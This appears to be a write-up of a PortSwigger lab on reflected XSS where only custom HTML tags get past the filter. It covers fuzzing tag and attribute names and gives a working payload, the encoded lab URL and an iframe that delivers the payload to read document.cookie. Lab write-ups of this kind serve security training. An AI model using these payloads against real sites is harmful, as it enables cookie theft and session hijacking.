
# Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.

---------------------------------------------

References: 

- https://portswigger.net/web-security/cross-site-scripting/contexts

---------------------------------------------

The search term is reflected inside an `h1` HTML element:



**Pic 1**


I used the following template payload for testing with Intruder:

```
<tag attrib=alert(1)>text</tag>
```

I tested the candidate attributes first:



**Pic 2**

The results indicate that the tested attributes are accepted:



**Pic 3**


Next, I tested which tags are accepted:



**Pic 4**


The following tag names passed the tests:
• animatetransform
• animatemotion
• custom tags
• animate
• iframe2
• audio2
• image2
• image3
• input2
• input3
• input4
• video2
• img2
• set
• a2



**Pic 5**


One payload that triggers the alert is:

```
<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>
```

```
https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E
```

```
<iframe src="https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E" width="100%" height="100%" title="Iframe Example"></iframe>
```

